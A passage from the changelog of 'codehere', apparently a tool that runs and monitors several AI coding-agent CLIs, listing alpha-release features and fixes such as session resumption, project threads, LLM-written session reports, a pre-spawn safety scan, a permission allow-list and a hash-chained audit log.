- **PM narrator voice** (M3) — mid-task plain-English summaries of what the agent is doing, fired every 30s while a session runs. Per-session 30s timer in SessionManager + `GET /api/task/:id/narration` + italic `.narrator-block` rendering on the session card. Honestly framed: "may be inaccurate" since narration is an LLM call.
- **Plain-English coverage** (M2) — `progress-aggregator` labels rewritten so a non-technical user can read them: "Grep" → "Search code for", "Delegate to subagent" → "Hand off to a specialist", "File op:" → per-command verbs (Create folder / Copy / Move / Remove / Create file / Write to file). 12/12 measurable labels now plain English (was 9/12). Regression test guards against jargon coming back.
- **Multi-agent parallel spawn** (M5) — `POST /api/task/batch` accepts up to 5 `{prompt, agent?, cwd?}` and spawns each through SessionManager (so pre-prompt scan still fires per task). Dashboard dropdown gets "⚡⚡ Send to every installed agent (N in parallel)" option that routes to the batch endpoint and renders one session card per spawn.
- **Cross-tool agent definitions** (M8 — confirmed shipped earlier) — `cross-tool-agents.ts` reads agents from `~/.claude/agents/`, `~/.opencode/agents/`, `~/.codehere/agents/` plus per-project equivalents. Plus `memory-injector` reads root `AGENTS.md` (agentic-stack convention).
- **PM narrator binding to reply input** (M4 partial) — reply mirror ships; full PM-brain routing depends on M3's narrator architecture maturing.
- **Hide technical detail behind toggle** (M6) — Advanced toggle on `/history` reveals seq + hash-chain columns + tamper-evidence banner; More-filters disclosure reveals per-tool + per-agent chip rows. Default chip count cut 14 → 4.

### Cross-vendor safety substrate (#110)

- **Pre-prompt scan** for all 5 adapters (`pre-prompt-scan.ts`) — refuses risky spawns before the agent starts. Mode-driven (block / advisory / log-only / off) per the existing hook config.
- **Post-tool audit mirror** for codex / gemini / aider — every tool call lands in the same `hook-events.jsonl` regardless of which adapter ran it. Visibility-only; per-tool BLOCKING on non-Claude needs upstream pre-tool hooks (v0.6+ track per FAQ).

### Permission gate (Track A P18 — 4 slices, all shipped)

- **Per-cwd allow-list primitive** — `.codehere/permissions.yaml` lets a user record explicit consent with a stated reason. Trust-scorer skips matched findings (Tier 0 pre-prompt + Tier 1 per-tool both honor it as of slice 2).
- **CLI** — `codehere permission list | allow <pattern> --reason "..." | deny | remove`.
- **Web write endpoint** — `GET / POST / DELETE /api/permissions` so dashboard panels can manage entries without shelling.
- **Session-card panel** — when a hook block fires for an active session, render an inline panel with "Approve in this folder" button. Per `feedback_overconfidence_guard.md`, copy is "Codehere noticed a pattern. Is this expected here?" — false-positives are the common case, approve is the prominent button.

### Track A — codehere-native UX (19/22 patterns shipped)

- **Identity primitives**: P10 per-agent badge · P8 status taxonomy · P6 11 macro states · P4 sidebar presence stack · P11 trust badge.
- **Activity primitives**: P13 micro-activity verb · P1 tool-progress live chip · P2 tool-use trace · P14 tool-call truncation · P7 file chip · P17 long-op indicator · P15 subagent dispatch.
- **Decision primitives**: P9 recovery affordance · P19 interrupt (2-press confirm) · P20 mode indicator · P3 session card re-shape · P12 audit log row + tamper-evidence banner + seq + hash advanced toggle · P18 permission gate (above) · P5 composer + cost row.
- **Bash output preview** (P22 — slices 1-3): ProgressStep gains `output?: string`; aggregator extracts tool-result text for Claude (`tool_use_id` match), Codex (`aggregated_output` on `command_execution` items), and Gemini (`tool_result` event with output / result / content / error fallback). Dashboard renders the last 4 lines under each step. Aider line-buffering + OpenCode buffered-output deferred for adapter-specific reasons.
- **Architecturally deferred**: P22 (Aider + OpenCode tail) · P16 streaming text · P21 opencode buffered reveal — all blocked on adapter event-shape work, not the Track A plan.

### UX simplification + persona alignment

- **Forensic surfaces gated** — seq column + hash-chain column + tamper-evidence banner all default-hidden on `/history`; revealed by Advanced toggle. Per-tool + per-agent filter chips behind More disclosure. Default chip count 14 → 4. Per `claim_user_persona` HIGH (non-technical primary).
- **Honest safety copy** — nav pill "Safety on" → "Codehere · blocking" (and matching scoped labels for warn / record / off). Codehere is a SECOND screen / cross-vendor audit, not the primary safety system. New STANDING rule `feedback_overconfidence_guard.md`.
- **Composer plain-English** — "0% ctx" → "0% used", "Auto · codehere routes" → "Auto-pick (codehere picks for you)", keyboard hints rewritten.
- **Dashboard 5-card cap** + "Show all sessions (N more)" button. Detected-process rows (diagnostic) gated behind Advanced.
- **`/history` row layout fix** — flex with explicit order, replacing the broken 5-column grid that caused stretched ALLOW pills + duplicate text on rows after seq + hash columns landed.

### Audit log integrity

- **Tamper-evidence banner** on `/history` — polls `/api/audit/verify` every 60s; surfaces hash-mismatch (real tampering) vs seq-gap (benign chain-restart anomaly) with severity-distinguishing copy.
- **`readChainTip` walks backward** through legacy entries — fixes a real chain-restart bug surfaced by the new banner: a trailing legacy line was making every subsequent append start a fresh chain at seq=0 with `prevHash` of zeros, which the verifier correctly flagged as `hash_mismatch`. Now skips legacy entries to find the most recent chained tip.
- **Stale RUNNING reconciliation** on daemon start — sessions left in `running` status after daemon restart are now reconciled to a synthetic `crashed` completion record so threads view shows accurate state.
- **Bug A5 / `/history` filter chips** — outcome (All / Blocked / Overridden) + per-tool + per-agent + Pre-prompt + Advanced toggle. URL hash preserves filter state across reload.

### Documentation

- **ARCHITECTURE.md §12** — architecture-to-ambition bridge: each v1.0 ambition (cross-vendor parity, 30-50 adapters, audit-everything, recovery, cost continuity, project memory, Final Report, tamper-evidence, non-technical UI, MCP) maps to architectural primitive(s) + shipped state + open work.
- **CAPABILITIES.md** — added Tier 0 (pre-spawn block) + Tier 1.5 (post-tool audit mirror) to the per-adapter coverage matrix.
- **THREAT_MODEL.md** — Surface 11 expanded; pre-prompt + per-tool + audit-mirror surfaces all share the same pattern bank, so bypass at the bank level evades all three (acknowledged).
- **AGENTIC_UX.md** — Track A + Track B status columns added inline.

---

## [0.5.0-alpha.6]

### Fixed

- **OpenCode follow-ups now route to the right session even when
  you've spawned another opencode task in the same folder.** Same
  shape as the gemini fix below. Spawn now tags every opencode
  session with `--title codehere-<id>`; reply paths run
  `opencode session list --format json`, find the row whose title
  matches the tag, and use `-s ses_*` instead of `--continue` (which
  always targeted the most recent session, regardless of which one
  the user actually wanted to reply to). Falls back to `--continue`
  if the lookup fails. Pure-function parser
  (`parseOpenCodeSessionIdByTitle`) exposed for tests; list timeout
  overridable via `CODEHERE_OPENCODE_LIST_TIMEOUT_MS`.

- **Gemini follow-ups now route to the right session even when you've
  spawned another gemini task in the same folder.** Previously the
  `--resume latest` shortcut meant a sibling gemini session could
  hijack your reply. Now the adapter captures the session UUID on
  spawn, asks gemini for the session list when you reply, and resumes
  the exact one you started — falling back to `latest` only if the
  list lookup fails. Pure-function parser exposed for tests
  (`parseGeminiSessionIndexForUuid`); list timeout overridable via
  `CODEHERE_GEMINI_LIST_TIMEOUT_MS`.

### Added

- **Rename a project from /threads.** Hover any project in the sidebar
  and click the pencil (✎) to rename. The rename sticks and survives
  daemon restarts — no more living with a bad auto-generated title.

  The hidden Title agent still names new projects from the first
  prompt, but it now steps back if you've named the project yourself.
  Same goes for the periodic title-backfill job: a manual rename wins
  over any later auto-title, even if the LLM call started before you
  renamed. Marker on disk: `userOverride: true` on the rename's
  project-update entry; both Title-agent paths re-check just before
  writing and bail if the marker is present.

---

## [0.5.0-alpha.6] — 2026-05-03

UX consistency + persistence patch release. Four founder-caught issues
across one extended dogfood session, all addressing real friction the
alpha.5 founder-as-user surfaced after a Mac restart and follow-up
exploration.

### Added

- **"Continue thread" intake button — Slack-shape spike.** Dashboard
  intake now has two submit modes: "Assign new" (existing — spawn a
  fresh task) and "Continue thread" (new — route the prompt as a reply
  to the most recent in-memory session for the current cwd, using the
  appendMessage path). Continue is disabled until a live in-memory
  session exists for the folder; title attribute previews what would be
  replied to. Cmd+Shift+Enter shortcut for Continue; Cmd+Enter remains
  Assign new (no breaking change). Step toward `project_slack_shape_north_star`
  — the long-term front-door redesign would promote Continue to default
  and collapse multi-card into one chronological thread per project. (`622a264`)

### Fixed

- **Final Report no longer disappears across daemon restarts.** Pre-fix,
  Final Reports lived only in `SessionManager.finalReportBySession`
  (in-memory Map) and were lost on every daemon bounce. Founder hit this
  after a Mac restart 2026-05-03: completed sessions showed "Generating
  report…" forever because the report data was wiped. Schema extension:
  new `{t: 'finalReport', id, summary, generatedAt, durationMs}` record
  type appended to `~/.codehere/sessions.jsonl` after the corresponding
  CompletedRecord. `loadRecent()` merges by sessionId. End-to-end smoke
  verified: spawn → Final Report generates → daemon restart → report
  still visible in /api/tasks `.persisted[]`. 5 new tests for the
  append/merge/missing-report/multi-session/malformed-line cases. (`9a4a2b1`)

- **"Generating report…" UI placeholder bounded to 90s post-completion.**
  After 90s with no Final Report, the placeholder switches to honest
  "Final Report unavailable for this session. (Most often this means the
  daemon restarted — re-spawn to get a fresh one.)" instead of looping
  forever. Combined with the persistence fix above, the perpetual
  "Generating report…" state is structurally impossible now: reports
  that DO generate persist + render; reports that genuinely fail (LLM
  provider down, daemon killed mid-call) hit the 90s timeout with an
  honest message. (`b48c146`)

- **Nav consistency across `/`, `/threads`, `/history`.** Founder
  caught: "some has highlight when opened, some has 'live'. it is
  confusing." Two fragmentation sources fixed: (a) `/history` had a
  `[● connecting/live]` SSE-state indicator in the global nav while the
  other pages didn't — moved to the page tagline area where per-page
  liveness belongs. (b) `/threads` had its own `.floating-nav .nav-link.active`
  rule with an orange background while `/` and `/history` use the
  SHARED_STYLES color-only highlight — deleted the local override; all
  three pages now share one floating-nav style. (`b48c146`)

- **Reply turns appear on `/threads`.** Pre-fix, every successful
  `appendMessage()` reply (via the dashboard reply box, the new /threads
  reply bar, or the new "Continue thread" intake button) updated only
  the in-memory session — the project-thread view showed only the
  original spawn, never follow-ups. Fix: `mirrorReplyToThread()` writes
  a complete task entry to the project's thread.jsonl with a fresh
  sessionId + parentSessionId pointing at the original. Reader's
  existing sessionId-merge logic surfaces each reply as a new
  chronological row. End-to-end smoke verified: reply on a session card
  → /threads taskCount jumps from N to N+1 within ~5s. 3 new mirror
  tests. (`ea9dfd8`)

### Operational notes

- **For real users:** `npm install codehere@alpha` upgrades from alpha.5.
  No data migration required. Sessions completed before this release
  won't have persisted Final Reports (those completed under the old
  in-memory-only behavior) — the new 90s timeout will fire the honest
  "report unavailable" message for them. Newly-completed sessions get
  persisted reports.
- **Pattern banked from this session**: any LLM-prompt-as-shipping-text
  needs the explicit anti-hallucination rule. Final Report and Title
  agent both hardened in alpha.5; only 2 narrative-output prompts in
  src — both audited clean. Future LLM-driven UI surfaces (Layer 5
  Handoff, F4 classifier copy) must follow the same pattern.
- **v0.6.x cleanup status**: 3 of 4 backlog items closed today. Remaining:
  gemini `--resume latest` → per-session UUID→index lookup, opencode
  `--continue` → `--title`-tagged session lookup. Both still scheduled
  for 2026-05-17 per `project_v06x_cleanup_backlog.md` memory.

---

## [0.5.0-alpha.5] — 2026-05-03

Multi-adapter REPL persistence release. Every adapter now sustains multi-turn conversations through the codehere supervisor — fulfilling the "C but all adapters" scope locked 2026-05-03 after founder flagged that codehere was running one-shot commands instead of continuous bare-REPL sessions. Plus two credibility-bug hot-fixes caught during dogfood: Final Report hallucinating file names, and 5/7 projects on /threads showing "(untitled)".

### Added

- **Multi-turn replies on every external-CLI adapter.** Until now, only Claude Code's session card supported follow-up replies; every other adapter showed "Reply unsupported for X yet." This release wires `appendMessage` for **codex**, **aider**, **gemini**, and **opencode**, each using its native session-resume mechanism:
  - `codex` — captures `thread.started` event's `thread_id`, follow-up uses `codex exec resume <thread_id> -` with the prompt via stdin (`9736e75`)
  - `aider` — cwd-scoped continuity via `aider --restore-chat-history --message <text>` (no per-session UUID needed; aider stores history in `.aider.chat.history.md`) (`f600e1a`)
  - `gemini` — `gemini -p <text> --resume latest` (gemini's --resume only accepts numeric index or "latest", not the session_id UUID; rigorous per-session-ID lookup queued for v0.6.x) (`e0697e5`)
  - `opencode` — `opencode --continue <text>` (opencode's run output buffers entirely until LLM completes, so session ID isn't observable mid-stream; same per-session-ID lookup queued for v0.6.x) (`0cfa167`)

- **Conductor inherits appendMessage from the routed specialist.** When you submit a prompt to conductor, it picks a specialist; when you reply on that thread, the reply goes to the SAME specialist that handled the original turn — no re-classification mid-thread. 4-line pass-through change. (`4464452`)

- **`/threads` page — single project thread view.** New navigable surface listing all known projects (left pane), the active project's chronological tasks (center, with agent badges + status pills + duration), and detected agents with presence dots (right pane). Reply box at thread bottom routes to the LAST task's session. Same shell as the dashboard (floating-nav pill + 3-column slack-shape grid + channels-pane + thread-pane + members-pane) so it doesn't fragment the design system. URL `?project=<slug>` deeplink. (`0e1b1d7`, `397a66a`, `efa1743`, `95d0de3`)

- **`/api/projects` + `/api/projects/:slug` endpoints.** Cheap list-and-fetch for the thread view. Slug regex `^([a-f0-9]{12}|unknown)$` rejects bad input with 400. 13 reader unit tests covering reconstruction-by-sessionId, project-update title precedence, malformed-line skip. (`397a66a`)

- **M9 hidden Title agent + retroactive backfill.** New projects get a 4-6 word title from the first prompt automatically (fires once per project, free Qwen 3 Coder via FCC by default, falls back to claude). v0.6.0 follow-up: a backfill module scans `~/.codehere/projects/` on daemon startup, fires the Title agent for projects that had `title=null`, appends a `project-update` line. End-to-end smoke on founder data: 5/7 untitled → 0 untitled in 22.7s, 5 LLM calls. Idempotent, opt-out via `CODEHERE_DISABLE_TITLE_AGENT=1`. (`9c8b56e`, `36e5803`)

- **M8 cross-tool agent reading.** Codehere's agents pane now reads agent definitions from 6 dirs (deduped): `~/.claude/agents`, `~/.opencode/agents`, `~/.codehere/agents`, plus the `.claude` / `.opencode` / `.codehere` subdirs in cwd. Surfaces them in `/api/readiness/agents` for any client. YAML preprocessor handles Claude Code's unquoted-colon descriptions. 14 unit tests. (`0aa09df`)

- **Forward-mirror new sessions to per-project `thread.jsonl`.** Every spawn + completion now writes a task entry to `~/.codehere/projects/<slug>/thread.jsonl` alongside the canonical `sessions.jsonl`. Migration handles historical data on first daemon start; this closes the gap so threads stay current as users work. Skips temp dirs (`/tmp`, `/var/folders`, etc.) by design. (`822849c`)

- **elu (`elu.dev`) joins the team roster as behavior reviewer.** Dev-only `<script>` injection gated by `CODEHERE_DEV_ELU=1`, never in releases. Founder dogfood sessions become elu's input feed; elu's findings flow into the same multi-tier review chain as Codex. Distinction: elu is integrated as a **team member** in the build loop, NOT as a product surface — shipping the script in releases would violate PRD §1.5 #2 "Zero telemetry by default." (`fbcecd4`)

### Fixed

- **Final Report no longer hallucinates file names.** Founder caught a Final Report claiming an empty directory contained "25 files and directories including package.json, README.md, app.tsx, components.tsx" — pure fabrication. Root cause: the prompt told the LLM "Name files specifically" without giving it the actual `ls` output. So when asked to be specific, the LLM confabulated plausible-sounding contents from prompt context clues. Fix: rewrite the prompt with an explicit anti-hallucination rule. The LLM now grounds every claim in the structured data it actually receives (steps + files-changed list), and explicitly says "nothing to verify; the session was read-only" when there's no signal. End-to-end smoke verified the same bug case now produces an honest summary. (`0f8804b`)

- **Title agent prompt hardened against subject-matter invention.** Same class of bug as Final Report: "Concrete and specific to the project, not generic" without source data invited the LLM to invent project nature from path-name context clues. Replaced with explicit grounding rule + fallback ("prefer naming the cwd's last path segment over invention"). (`36e5803`)

- **`/threads` no longer fragments the design system.** Original page (Slice 4) used a fresh single-column layout with custom header — a second visual language inside the same product. Founder caught the drift. Rewrite uses the dashboard's exact shell (floating-nav, 3-column slack-shape grid, channels-pane left + thread-pane center + members-pane right). (`95d0de3`)

### Operational notes

- **For real users:** `npm install codehere@alpha` upgrades from alpha.4. Migration auto-runs on first daemon startup (idempotent). Title backfill auto-runs in background on startup (silent unless `CODEHERE_DEBUG=1`). No data migration required from the user.
- **Scheduled cleanup**: `2026-05-17` — replace gemini `--resume latest` + opencode `--continue` shortcuts with per-session-ID resumption (eliminates concurrency caveat where another session in same cwd between turns routes follow-up to wrong session). Tracked in `project_v06x_cleanup_backlog.md` memory.
- **Pattern emerging**: any LLM prompt that asks for "specific" output without giving the model the source data needs an explicit anti-hallucination rule. Both Final Report and Title agent are now hardened; only 2 narrative-output prompts in src — both audited clean.

---

## [0.5.0-alpha.4] — 2026-05-02

Critical regression-fix release. Two reply-to-thread bugs from alpha.3 found by founder taste-test, plus one UX honesty fix.

### Fixed

- **Reply-to-thread input was always disabled on freshly-spawned sessions.** The `POST /api/task` response was missing the `canAppendMessage` field, so the UI's optimistic attach (which constructs the session object from the response, no re-fetch) always rendered the reply input as disabled regardless of which agent was picked. After page reload it would have populated correctly via polling, but spawn-and-immediately-test (the actual user path) showed "Reply unsupported for Claude Code yet". Fixed by including `canAppendMessage: session.canAppendMessage === true` in the spawn response and passing it through `assignTask` to `attachSession`. Verified end-to-end via curl smoke before commit. (`a570b56`)

- **Reply on Claude Code sessions exited 1 with API "Invalid signature in thinking block".** The follow-up was using `claude -p text -c` which picks "the most recent conversation in current directory" — fragile when the cwd has multiple concurrent claude sessions OR when the original conversation contains thinking blocks (Opus advanced reasoning) the headless API can't replay. Fixed by capturing the claude session_id from the original spawn's stream-json `init` event, then using `claude -p text --resume <session-id>` for unambiguous, replay-safe continuation. Verified end-to-end: spawn → wait → reply returns full-context response. (`1df8325`)

- **`+ New project` sidebar button removed.** Its label promised a new project entry in the sidebar; the click handler just cleared the cwd input + scrolled + focused. Mental-model mismatch caused real founder confusion in iter-13 tasting. Real multi-project sidebar is v0.6.x patch work. The cwd input in the intake form remains the canonical way to switch project folders. (`81e3c43`)

### Added (internal — v0.6.0 foundation, not user-facing yet)

- **v0.6 master plan + v0.6.0 PRD + architecture survey** — `docs/PLAN_v0.6.md`, `docs/prd/v0.6.0-persistent-project-thread.md`, `docs/research/v0.6-architecture-survey.md`. MoSCoW scope (M1-M9 must), product KRs, per-version exit criteria, pre-mortem, OpenCode/Anthropic/AGENTS.md interop principles. All four v0.6.0 spikes complete with GO/NO-GO captured.

- **Project thread migration foundation** — TS module + 14 tests + hidden CLI subcommand `codehere migrate-threads [--dry-run|--rollback|--keep-temp-dirs]`. Auto-runs on daemon start (idempotent, opt-out via `CODEHERE_DISABLE_THREAD_MIGRATION=1`). Migrates `~/.codehere/sessions.jsonl` → `~/.codehere/projects/<slug>/thread.jsonl`. Smoke-tested on real founder data: 620+ sessions migrated to 4 real projects (after temp-dir filter) in ~6ms, lossless + reversible. **Forward-mirroring is NOT yet shipped** — next commit on dev branch. UI doesn't surface the project thread shape yet either — that's v0.6.0 M1 (~2 days build). (`42e4d08`, `9859191`)

### Operational notes

- Per `claim_way_of_work` lesson banked tonight: any user-visible feature claim now requires command-line evidence in the commit message body, not just "tests pass". Both fixes in this release include curl + response evidence in their commit bodies.
- Forward-compatible with alpha.3 user data — migration is additive (`~/.codehere/projects/` is new; `~/.codehere/sessions.jsonl` preserved unchanged).
- Real users on `npm install codehere@alpha` move from broken-reply alpha.3 to working-reply alpha.4 transparently.

---

## [0.5.0-alpha.3] — 2026-05-02

### Added

- **Final Report — plain-English 3-paragraph summary at end of every spawned task.** Renders in both terminal (where the daemon runs) and the web UI session card. Auto-updates without page refresh (5s polling patches existing cards). Routes through FCC proxy (free via Qwen 3 Coder 480B / NIM) by default; falls back to paid Claude if FCC isn't running. Per claim_market_position v3, this is the keystone delivery moment for the non-technical-user persona — none of the surveyed multi-agent orchestrators (ComposioHQ, Overstory, Praktor, Claude Squad, AI-Agents-Orchestrator) advertise this artifact. (`8c7070f`, `bb56903`, `709fa52`)

- **Reply-to-thread for claude-code sessions.** Type a follow-up in the session card, hit Send (or Cmd+Enter). Your message appears immediately; Claude's response appears 3-15s later. Each reply spawns a fresh `claude -p "<text>" -c` in the session's cwd — Claude Code's native `-c` flag continues that directory's most recent conversation, so the follow-up has full prior context without us tracking session IDs. Other adapters show a clear "Reply unsupported for <agent> yet" disabled state. (`36ad2e9`)

- **`+ New project` button now functional.** Previously dead chrome with `title="Coming soon"`. Click clears the cwd input + scrolls intake into view + focuses it. Multi-project sidebar (real folder picker, multi-channel) is v0.6.x scope. (`41fa005`)

- **Members-pane click selects agent.** Clicking any agent row in the right "Agents" pane sets the agent dropdown + dispatches a change event (so the existing setup-panel logic shows install/auth help for needs_install / needs_auth states) + scrolls intake into view + focuses prompt textarea. Previously the rows had `cursor: pointer` styling but no click handler. (`41fa005`)

- **Local syntax-check guard for inline JS in TASK_HTML.** New test (`test/cli/ui-served-html-syntax.test.ts`) extracts every `<script>` block from the served HTML and feeds it to `new Function(body)` to verify it parses. Catches template-literal escape bugs (where a `\n` in TS source collapses to a real newline at build time) BEFORE founder sees a runtime SyntaxError in the browser. Banked under iter 12 dogfood-as-validation. (`d2451e5`)

### Fixed

- **3 internal-only commands hidden from `--help`** (`completion`, `scan-tool`, `protocols`). Visible commands count: 17 → 13. Per the `feedback_one_canonical_entry.md` rule — when 3 commands do overlapping things, pick the BEST one as the front door, hide alternatives from the new-user surface. (`9e84c2e`)

- **`codehere init` "Next:" output no longer suggests dual-path "memory init" + "memory show injection".** The dual paths confused new-user dogfood at the iter 12 walkthrough — single canonical onboarding now. Power-user paths still work, just not advertised at the new-user moment. (`9e84c2e`)

- **Bug 2 sister-fix: in-memory `completedAt` Map.** The `/api/tasks` serializer now includes `completedAt` for in-memory exited sessions. Without this, status=completed sessions showed NaN duration in the UI for the brief window between exit and next jsonl flush. (`9e84c2e`)

- **Final Report regex broken by TypeScript template literal `\n` collapse.** The `split(/\n\s*\n/)` regex in the inline JS got compiled as `/<NEWLINE>s*<NEWLINE>/` because TS template literals interpret `\n` as actual newline characters at build time. Browser saw a regex spanning multiple lines → invalid syntax → entire script after that line threw, killing the agents-list and sessions-list renderers. Fixed by escaping to `/\\n\\s*\\n/`. (`3f606f4`)

- **Second template-literal escape bug — same class.** A code comment I added to explain the regex fix itself contained `\n` characters, which the template literal expanded to real newlines, breaking the comment across lines and exposing a stray `in` keyword to the JS parser. Rewrote the comment without `\n` literals. (`d2451e5`)

- **Memory rule correction: `claude --bare` does NOT route through FCC proxy.** The May 1 memory rule said "--bare bypasses cached OAuth" — wrong. Live test 2026-05-02: `claude --bare` returned "Credit balance is too low" (went to paid Claude OAuth, not the proxy). The correct binary is `claude-free`. Final Report MVP provider chain now tries `claude-free` first (FCC-routed, free), falls back to `claude` (paid). Override via `CODEHERE_REPORT_BINARY` env var. (`709fa52`)

### Operational notes

- **Master v0.6 plan locked at `docs/PLAN_v0.6.md`** — MoSCoW (M1-M9 must / S1-S7 should / C1-C9 could / W1-W10 won't), product KRs (KR-P1 through KR-P10, no distribution metrics), per-version exit criteria (5 dimensions: functional / quality / performance / risk / time), pre-mortem (10 product/engineering failure modes), validation spike list. Scope-locked. (`0af5344`)

- **First v0.6 PRD ready at `docs/prd/v0.6.0-persistent-project-thread.md`** — persistent project thread replaces session-card-per-task. PM brain orchestration shape (Slack-style chat with codehere as the manager). Cross-tool agent definition reading (M8: `.opencode/agents/`, `.claude/agents/`, root `AGENTS.md`). Hidden Title agent (M9). Time-box: 7-10 days from start. (`2f6a3a5`)

- **Architecture survey plan at `docs/research/v0.6-architecture-survey-plan.md`** — 25hr deep-read across LangGraph, AutoGen, CrewAI, OpenAI Agents SDK, Anthropic sub-agents, OpenCode (+ rmkohlman/opencode-agents hub-and-spoke + saeid-rez/OpenCode-Multi-Agent-Setup pipeline templates), Aider, Overstory. Output document (`docs/research/v0.6-architecture-survey.md`) populated as deep-reads complete. Phase 1 (~7hr) gates v0.6.0 build; Phase 2 (~15hr) gates v0.6.4 multi-agent. (`79e21c7`)

- All commits passed multi-tier dogfood-loop review (codex Tier-0 + claude-free Qwen 3 Coder 480B Tier-1).

- Memory rule files updated: `feedback_full_agent_stack_in_dogfood.md` item 7a (claude-free vs claude --bare), `claim_user_persona.md` (HIGH confidence locked), `claim_codehere_shape.md` (REFUTED-DEPENDENCY → v4 needed after v0.6.0), `claim_market_position.md` (v3 capture-strategy partially refuted iter 13 by Claude Security GA + Claude Code Review), `claim_way_of_work.md` (P7 dogfood-as-validation, P8 30-day competitor scan).

---

## [0.5.0-alpha.2] — 2026-05-01

### Fixed

- **Bug 2 — zombie RUNNING sessions in persisted state.** The Conductor adapter mirrored the specialist's terminal status AFTER emitting the exit event, so the persistence handler read stale `'running'` and wrote 138/155 sessions to `~/.codehere/sessions.jsonl` with `status='running'` AND `completedAt` set. Pre-fix data on disk auto-repairs on next daemon load via a defensive normalization in `loadRecent()` (records with `status='running' && completedAt > 0` surface as `'completed'`). Four regression tests added including a brittle-by-design grep against the source pattern. (`74b472f`)

- **Adapter readiness probes lied.** Both Gemini and OpenCode reported `state='ready'` to `/api/readiness/agents` when no auth was configured — users saw `ready` chips in the UI dropdown, spawned tasks, then errored 40-50s later with no clear next step. Both probes now return `needs_auth` with a copyable recovery hint when env vars / config files are missing. (`a9d468c`)

### Added

- **First-party security audit** at `docs/SECURITY_AUDIT_2026-05-01.md`. OWASP Top 10 + STRIDE methodology run by Claude Opus 4.7 via gstack `/cso` skill on the codehere codebase. Result: 0 critical, 0 high, 2 medium (both fixed in the same commit — audit log directory now created with mode `0o700` and file mode `0o600`; `softprops/action-gh-release` SHA-pinned in the publish workflow). Indexed from `agent/README.md`. (`3958139`, `4fed6b6`)

- **Pre-tag npm-versions tombstone check** at `scripts/pretag-npm-check.sh`, wired into the publish workflow. Detects `E400 (tombstoned)` and `E409 (already published)` failure modes 2 minutes earlier than `npm publish` would, with the right next action. v0.2 / 0.3 / 0.4 / 0.5.0-alpha are all tombstoned on the registry; v0.5.0-alpha.2 verified FREE before this tag. (`8ed8473`)

- **Multi-model dogfood-loop gate** at `scripts/multi-review.sh`. Routes any commit through three free NIM models (Qwen 3 Coder 480B, gpt-oss-120b, llama-3.3-70b) via the `free-claude-code` proxy, prints each model's reasoning side-by-side, and exits non-zero if any reviewer flags `NEEDS-FOLLOWUP` — usable as a real merge gate. ALWAYS uses `claude --bare` and verifies routing via the proxy log API_REQUEST delta, structurally preventing the OAuth-fallback failure where calls silently route back to paid Claude. Includes 3-attempt retry on transient NIM upstream errors. (`74e6765`, `a74af03`)

- **Per-arc retro script** at `scripts/codehere-retro.sh`. 30-line bash that captures sessions / test LOC ratio / hotspots / commit-type mix from git log over any window. Adopted from gstack's `/retro` skill IP without the surrounding skill scaffolding. (`4fed6b6`)

### Reverted

- **kimi-cli adapter (was added in alpha.1).** Shipped on a "free tier" claim that originated as an unverified Apr 29 brainstorm output. Live test of `kimi /login` returned **HTTP 402 Payment Required** — the Kimi Code OAuth flow is paid, not free. Reverted to comply with the F1 free-tier filter. The kimi-cli is technically a multi-provider client and CAN be pointed at OpenRouter or NIM via TOML config — when that path is verified live and documented in the adapter source, kimi-cli will be reconsidered. Until then, kimi power-users can wire it via `agents.yaml` (Generic CLI adapter). (`95c29ee`, `e1f0b25`)

### Operational notes

- `~/.codehere/sessions.jsonl` zombie records from previous daemon runs (status='running' with completedAt set) auto-repair on next daemon load — no migration script needed.
- All commits in this release either passed the multi-tier review loop or carry an explicit `[no-review:]` audit marker. Tier-0 codex was rate-limit-blocked through 2026-05-04 1:46 AM; Tier-1 free-claude-code (Qwen 3 Coder 480B via NIM) was the substitute for non-`[no-review:]` paths.

---

## [0.5.0-alpha.1] — 2026-04-29

### Project memory — F3

Codehere's project memory ships as a four-layer store at `.codehere/memory/`. Once you've run `codehere init` in a project, every spawned agent — Claude Code, Codex, Aider, OpenCode, Gemini, and any user-configured generic CLI agent — reads the memory on entry automatically. The agent starts warm with the briefing, recent lessons, and the most-referenced symbols in your repo. No more cold-grepping every session.

What this gives you, end-to-end:

- **`codehere init`** scaffolds the four-layer memory tree alongside the existing `CONTEXT.md` / `HANDOVER.md` / `PROMPTS.md`. Idempotent and safe — leaves your existing files untouched.

- **`codehere memory init`** migrates the old layout into the new one in one shot:
  - `CONTEXT.md` → `AGENTS.md` (the cross-tool standard name)
  - `HANDOVER.md` → `memory/working/session.md`
  - `PROMPTS.md` → one `skills/<name>/SKILL.md` folder per `##` section
  Old paths stay as symlinks for back-compat (or use `--no-symlinks` to clean up). `--dry-run` shows what would move without touching anything. `--force` overwrites if you're sure.

- **Root-level `AGENTS.md` is honored** even when no `.codehere/` directory exists. Codehere now respects the cross-tool agentic-stack convention: drop an `AGENTS.md` at your repo root and codehere will inject it as the project briefing when spawning any agent.

- **`codehere memory repo-map`** builds a JSON symbol map of your project — every top-level function, class, constant, interface, type, and Python def, ranked by how often each is referenced. Re-run with `--rebuild` after a big refactor. `_stats.skippedLargeFiles` in the output tells you if anything was left out of the walk.

- **The episodic memory** at `.codehere/memory/episodic/AGENT_LEARNINGS.jsonl` is now a symlink to `~/.codehere/sessions.jsonl` — the session log codehere has been writing since v0.1. Every project inherits its full execution history at the canonical F3 path.

- **`codehere memory show [layer]`** is the read-only inspector. No-arg overview prints a one-line summary per layer. `codehere memory show injection` previews exactly what would prepend to an agent's prompt at spawn — no more invisible auto-injection.

- **`codehere memory graduate`** promotes patterns into project-wide lessons. `--add "<text>"` adds a free-text lesson directly. `--accept <id>` graduates a pending candidate. `--reject <id>` deletes a candidate without graduating. The candidate's id is its **filename** (the `.json` stem) — that's what shows in the list and what `--accept` / `--reject` expects. (The auto-dream pipeline that POPULATES candidates lands in v0.6; v0.5 ships the graduation primitives so you can manually drop in candidate files or skip straight to `--add`.) Lesson ids are content-derived (16-hex sha256) so the same text twice is a no-op.

- **Memory injection at spawn** wires the four memory layers into the prompt prefix of every adapter — Claude Code, Codex, Aider, OpenCode, Gemini, and any user-configured generic CLI agent. Token-budget aware (~3000 default, drops lower-priority sections first; the AGENTS.md / CONTEXT.md briefing never drops). Pass `noMemoryPrefix: true` in `SpawnOptions` to opt out programmatically (CLI flag exposure follows in v0.6). A structural trip-wire test asserts every adapter file actually wires the injection, so accidentally removing it from a single adapter fails CI immediately.

- **`codehere protocols export`** writes the trust-scorer pattern bank (34 patterns today) to `.codehere/protocols/hook_patterns.json` — inspectable, version-controllable, shareable. Project-specific patterns under `patterns_project[]` survive every re-export.

### Aider observability

